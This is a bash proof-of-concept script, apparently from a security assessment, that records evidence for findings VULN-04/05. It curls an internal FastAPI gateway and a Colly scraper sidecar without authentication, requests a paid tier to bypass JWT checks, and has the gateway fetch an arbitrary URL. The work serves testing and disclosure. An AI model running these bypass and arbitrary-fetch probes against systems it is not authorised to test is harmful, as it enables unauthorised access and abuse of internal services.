#!/usr/bin/env bash
# VULN-04/05: Direct access to internal FastAPI gateway and Colly sidecar
set -euo pipefail

OUT_DIR="$(cd "$(dirname "$0")/../evidence" && pwd)"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
# shellcheck source=local-env.sh
source "$SCRIPT_DIR/local-env.sh"
OUT_FILE="$OUT_DIR/VULN-04-gateway-direct.txt"

mkdir -p "$OUT_DIR"

GW_BASE=$(pick_gateway)
COLLY_BASE=$(pick_colly)

{
  echo "=== VULN-04/05 Internal API Direct Access ==="
  echo "Gateway: $GW_BASE"
  echo "Colly: $COLLY_BASE"
  echo "Timestamp: $(date -u +"%Y-%m-%dT%H:%M:%SZ")"
  echo ""

  echo "--- FastAPI root (no JWT) ---"
  curl -s -w "\nHTTP %{http_code}\n" --connect-timeout 5 "$GW_BASE/" 2>&1 | head -15
  echo ""

  echo "--- Reddit scaled tier=paid (bypass Nest JWT) ---"
  curl -s -w "\nHTTP %{http_code}\n" --connect-timeout 30 \
    "$GW_BASE/reddit/scaled/search?subreddit=technology&query=ai&limit=2&tier=paid" 2>&1 | head -60
  echo ""

  echo "--- Scrapling fetch arbitrary URL ---"
  curl -s -w "\nHTTP %{http_code}\n" --connect-timeout 15 \
    "$GW_BASE/scrapling/fetch?url=https://example.com" 2>&1 | head -25
  echo ""

  echo "--- Colly health (no auth) ---"
  curl -s -w "\nHTTP %{http_code}\n" --connect-timeout 5 "$COLLY_BASE/health" 2>&1
  echo ""

  echo "--- Colly scrape (no auth) ---"
  curl -s -w "\nHTTP %{http_code}\n" -X POST "$COLLY_BASE/scrape" \
    -H "Content-Type: application/json" \
    -d '{"url":"https://example.com","maxDepth":0}' 2>&1 | head -30
} | tee "$OUT_FILE"

echo "Saved: $OUT_FILE"
